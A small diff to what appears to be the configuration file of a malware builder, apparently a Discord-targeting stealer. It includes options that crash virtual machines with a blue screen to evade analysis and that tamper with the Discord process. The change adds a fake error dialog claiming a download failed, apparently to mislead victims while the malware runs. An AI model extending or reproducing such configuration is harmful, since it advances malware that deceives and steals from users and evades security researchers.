@@ -13,6 +13,10 @@ module.exports = {
   vmProtect: true,
   bsodIfVm: true,
   fakeError: true,
+  fakeErrorDetails: {
+    title: 'Error',
+    message: 'An error occurred while downloading files. Please try again later.'
+  },
   discord: {
     killProcess: false
   },
